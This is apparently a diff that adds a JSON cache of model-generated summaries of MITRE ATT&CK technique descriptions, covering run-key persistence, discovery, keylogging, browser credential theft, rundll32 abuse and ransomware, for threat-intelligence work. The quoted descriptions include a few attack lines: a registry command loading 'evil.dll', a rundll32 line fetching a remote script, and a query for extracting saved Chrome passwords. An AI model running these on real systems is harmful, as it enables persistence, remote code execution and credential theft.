+        "prompt_sha256": "c66eaac7da123fc55fa1c4bd444cca6c7bfa0748404c1f91528863d0f4844842",
+        "replicate": 0,
+        "cache_key": "1b165d92b81ca40043bd2a2eed692bd8f8a0cb27267757392a7e2e696f3e1372",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1547.001",
+      "source_description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code>\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
+      "raw_summary": "{\"summary\": \"Adversaries may achieve persistence by placing programs in startup folders or referencing them using Registry run keys and boot configuration values. Entries in these locations cause programs to execute automatically at boot or when a user logs in, running under the context and permissions of that user. Adversaries can leverage these methods to execute malware across system reboots and may use masquerading to make entries appear associated with legitimate programs.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1547.001]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:02+00:00",
+        "temperature": 0,
+        "prompt_sha256": "e86f100659a3811598ef3b0d3c602c5c99602ce3be250c4c35439bd4c8dc5811",
+        "replicate": 0,
+        "cache_key": "9ad16cd47f199889e48892bcfad43e2b25bfb2661d1b94919dbf17da85f5cb34",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1033",
+      "source_description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl. list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
+      "raw_summary": "{\"summary\": \"Adversaries may attempt to identify the primary user, currently logged-in users, common users, or active system usage to shape follow-on behaviors such as whether to fully infect a target. This information can be collected through various methods, including process ownership, file and directory ownership, session details, system logs, and credential dumping. Utilities, environment variables, and command-line tools across various operating systems and network devices can be used to acquire these user details.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1033]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:26+00:00",
+        "temperature": 0,
+        "prompt_sha256": "de66f2379450e51cbb96ef05410e86ea952809580d06954dfd2b564796751020",
+        "replicate": 0,
+        "cache_key": "fa79f207e9bf5adf6336ef2853d4a69a7ed435ab11867e8fe3a3c56fbb80b222",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1082",
+      "source_description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from Local Storage Discovery which is an adversary's discovery of local drive, disks and/or volumes.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\n\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.",
+      "raw_summary": "{\"summary\": \"Adversaries may attempt to gather detailed operating system and hardware information, such as versions, patches, and architecture, to shape follow-on behaviors. They can obtain this data using tools like Systeminfo, macOS systemsetup, network device CLIs, ESXi esxcli utilities, or cloud provider APIs. Combined with other discovery efforts, this information can drive payload development and concealment.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1082]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:09+00:00",
+        "temperature": 0,
+        "prompt_sha256": "827d18b03098fb669c6edcf558afeb41a6bd6c097877592f5713ae2351a8b95c",
+        "replicate": 0,
+        "cache_key": "9ca4e53ceb6cf4640aed1c43c5ae156f3925b3ed06c556db945ae8540684ce75",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1057",
+      "source_description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. ESXi also supports use of the `ps` command, as well as `esxcli system process list`.\n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
+      "raw_summary": "{\"summary\": \"Adversaries may attempt to obtain information about running processes to understand common software and shape follow-on behaviors, with elevated access potentially providing better details. This process enumeration can be carried out across Windows, Mac, Linux, ESXi, and network devices using various built-in commands, utilities, APIs, or `/proc`.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1057]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:14+00:00",
+        "temperature": 0,
+        "prompt_sha256": "71627a024e003b900f11d1bb87a889a06bfa9709ba29e29d71a6af6bee79326b",
+        "replicate": 0,
+        "cache_key": "afcb6f239ecfd8be55aa580faabb62e5afb99c2c7149b621b6131b5651036287",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1007",
+      "source_description": "Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>. Adversaries may also gather information about schedule tasks via commands such as `schtasks` on Windows or `crontab -l` on Linux and macOS.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
+      "raw_summary": "{\"summary\": \"Adversaries may gather information about registered local system services and scheduled tasks using tools or operating system utility commands such as sc query, tasklist /svc, systemctl --type=service, net start, schtasks, and crontab -l. They may use this information during automated discovery to shape follow-on behaviors, including whether to fully infect the target or attempt specific actions.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1007]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:20+00:00",
+        "temperature": 0,
+        "prompt_sha256": "dbd1374c298ae2c75040d5731257465c98945bc9a841d366f19834b7dca0c229",
+        "replicate": 0,
+        "cache_key": "fea97cca70ecc835e53717f830e24416a2f07811ed4b832758cf105bb264d6ae",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1056.001",
+      "source_description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
+      "raw_summary": "{\"summary\": \"Adversaries may log user keystrokes to intercept typed credentials, potentially clearing browser cookies to force reauthentication and capture them more quickly. Methods for intercepting keystroke data include hooking API callbacks, reading raw data from hardware buffers, modifying the Windows Registry, using custom drivers, and modifying system images.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1056.001]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:34+00:00",
+        "temperature": 0,
+        "prompt_sha256": "cf23ff7db1a696469b14be6042dc585068caa9440a709882b1b84fff03776478",
+        "replicate": 0,
+        "cache_key": "0735be5c14442afa3650f0e2a2030806a7a3793a1c717d7584bed8f285964276",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1555.003",
+      "source_description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
+      "raw_summary": "{\"summary\": \"Adversaries may acquire credentials from web browsers by reading browser-specific files or searching process memory for credential patterns. Although web browsers typically store saved usernames and passwords in encrypted formats, methods exist to extract plaintext credentials. After obtaining these credentials, adversaries may attempt to recycle them across different systems and accounts to expand access.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1555.003]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:08:33+00:00",
+        "temperature": 0,
+        "prompt_sha256": "163d3a8125728f7becf1ba660fc71aa3570d0f27e976ef4d8b43df905e2b380d",
+        "replicate": 0,
+        "cache_key": "0ee7722783d1f76385e08c5ad12504c2cd2b8b215b90f90b18d66e271ab3914a",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1021.001",
+      "source_description": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.",
+      "raw_summary": "{\"summary\": \"Adversaries may use valid accounts to log into a computer using the Remote Desktop Protocol (RDP) to perform actions as the logged-on user. If the service is enabled and permits access to accounts with known credentials, adversaries can connect over RDP or Remote Desktop Services (RDS) to expand their access. They may also use acquired credentials with RDP, or combine RDP with Accessibility Features or Terminal Services DLL for persistence.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1021.001]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T17:37:10+00:00",
+        "temperature": 0,
+        "prompt_sha256": "a8d9ec2c11059bfbcbd909e016e62108a23b55c502b813db3a8cc68d25420ba4",
+        "replicate": 0,
+        "cache_key": "98c01d7a798e48a9162d6dc9eeada253b556474004e5b57bd3f28eae31ee0bf3",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1219",
+      "source_description": "An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management. Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nRemote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.\n\nInstallation of many remote access tools may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).",
+      "raw_summary": "{\"summary\": \"Adversaries may use legitimate remote access tools or defensive software response features to establish an interactive command and control channel within a network. These tools can be installed post-compromise for redundant access, interactive sessions, or as malware components to establish reverse connections to adversary-controlled systems. Additionally, installing these tools may establish persistence, or adversaries may abuse remote access features already present in existing software.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1219]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:38+00:00",
+        "temperature": 0,
+        "prompt_sha256": "735d397c3d35bbb8b94836c9d5919d94d9e644efe31aa255182452285c709183",
+        "replicate": 0,
+        "cache_key": "4d87a24f56b27625441431da740176303f84509a68e6c10f4396633c45b3286b",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1567.002",
+      "source_description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
+      "raw_summary": "{\"summary\": \"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services, such as Dropbox and Google Docs, allow data to be stored, edited, and retrieved remotely over the Internet. Exfiltration to these services can provide cover to the adversary if network hosts already communicate with the service.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1567.002]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T17:37:59+00:00",
+        "temperature": 0,
+        "prompt_sha256": "9a68a5be32620c55da6753aac590aa276553b5d0f07a85d336de1b003734b39a",
+        "replicate": 0,
+        "cache_key": "8d56e5b7714393d9aab7b96a3214685deb39ea229ea78baa24a9255b8feeef7b",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1218.011",
+      "source_description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a.cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code> This behavior has been seen used by malware such as Poweliks.\n\nThreat actors may also abuse legitimate, signed system DLLs (e.g., <code>zipfldr.dll, ieframe.dll</code>) with <code>rundll32.exe</code> to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",
+      "raw_summary": "{\"summary\": \"Adversaries may abuse rundll32.exe to proxy the execution of malicious code, such as DLL payloads, Control Panel Item files, or scripts, to avoid triggering security tools. They may also abuse legitimate, signed system DLLs with rundll32.exe to execute malicious programs or scripts indirectly. Additionally, adversaries can obscure malicious execution by exploiting DLL function name loading behaviors, executing functions by ordinal numbers, or using masquerading techniques.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1218.011]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:48+00:00",
+        "temperature": 0,
+        "prompt_sha256": "c4d1a911450a9c876575a73b0aa285a1cfffda3cec53b480b1eb140dd60cdccc",
+        "replicate": 0,
+        "cache_key": "386184ea35aef4996c51b0cf3b97f660c4910871fa3112cdcbd2fff6c20d2659",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1070.004",
+      "source_description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.",
+      "raw_summary": "{\"summary\":\"Adversaries may delete malware, tools, or other files left behind during an intrusion to remove traces and minimize their footprint. This removal can take place during the intrusion or as a post-intrusion process. To perform cleanup, adversaries can use other tools or built-in operating system functions, such as del on Windows, rm or unlink on Linux and macOS, and rm on ESXi.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1070.004]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T18:07:53+00:00",
+        "temperature": 0,
+        "prompt_sha256": "70668a03cef752962a02f1ff6ff206166f533459c9cdb1cdfbf006e2304deb8c",
+        "replicate": 0,
+        "cache_key": "6ecb8fbea3376f039d69d6ba8f1585edee3217af614b5843e8b4ca9a4a14f6f0",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    },
+    {
+      "technique_id": "T1486",
+      "source_description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted. For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data.",
+      "raw_summary": "{\"summary\": \"Adversaries may encrypt data on local, remote, virtual machine, or cloud storage systems and withhold decryption keys to disrupt resource availability, either to extort monetary compensation or to permanently destroy access. Such operations typically target user files, critical system files, disk partitions, or hypervisor-hosted virtual machines, sometimes requiring behaviors like permission modifications to unlock targets. Additionally, encryption malware may include worm-like network propagation capabilities and engage in intimidation tactics like ransom notes or internal defacement.\"}",
+      "status": "ok",
+      "violations": [],
+      "error": null,
+      "llm_meta": {
+        "purpose": "step4_summary[T1486]",
+        "model": "gemini-3.8-flash",
+        "model_version": "gemini-3.8-flash",
+        "timestamp": "2026-10-18T17:38:05+00:00",
+        "temperature": 0,
+        "prompt_sha256": "189fc501c908574fdafc2d9f86824cd4d7de16a97fb5d5384a9a2b8a5aa6dc27",
+        "replicate": 0,
+        "cache_key": "ff9594ebaba987f65e4eeac814321a0bb3136f27fc4c0d1ee954f37416632f1b",
+        "source": "gemini-api",
+        "from_cache": true,
+        "prompt_template": "summary_v1.txt"
+      }
+    }
+  ]
+}
